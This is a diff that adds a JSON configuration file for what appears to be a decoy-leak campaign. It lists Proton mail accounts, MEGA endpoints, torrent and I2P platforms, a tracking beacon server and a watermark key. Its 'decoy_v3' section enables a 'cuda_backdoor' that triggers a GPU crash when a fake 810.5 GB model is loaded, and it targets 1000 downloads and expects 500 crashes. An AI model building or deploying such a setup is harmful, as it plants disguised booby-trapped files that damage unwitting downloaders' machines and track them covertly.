@@ -1,0 +1,47 @@
+{
+  "proton_accounts": [
+    "strategickhaos_01@proton.me",
+    "strategickhaos_02@proton.me",
+    "strategickhaos_03@proton.me"
+  ],
+  "mega_endpoints": [
+    "https://mega.nz",
+    "https://mega.co.nz"
+  ],
+  "decoy_versions": ["v1", "v2", "v3"],
+  "beacon_server": "https://asteroth-gate.strategickhaos.internal/beacon",
+  "watermark_key": "strategickhaos-sovereign-2024",
+  "platforms": {
+    "1337x": {
+      "enabled": true,
+      "tracker": "udp://tracker.1337x.org:80/announce"
+    },
+    "i2p": {
+      "enabled": true,
+      "vm_id": "swarm_guardians_vm_01"
+    },
+    "mega": {
+      "enabled": true,
+      "rotation_enabled": true,
+      "links_per_decoy": 3
+    },
+    "rutracker": {
+      "enabled": true,
+      "bot_id": "rutracker_bot_001",
+      "language": "ru"
+    }
+  },
+  "monitoring": {
+    "beacon_tracking": true,
+    "scoreboard_interval_seconds": 60,
+    "alert_on_real_leak": true
+  },
+  "decoy_v3": {
+    "enabled": true,
+    "cuda_backdoor": true,
+    "gpu_crash_trigger": "on_model_load",
+    "fake_model_size_gb": 810.5,
+    "target_downloads": 1000,
+    "expected_crashes": 500
+  }
+}
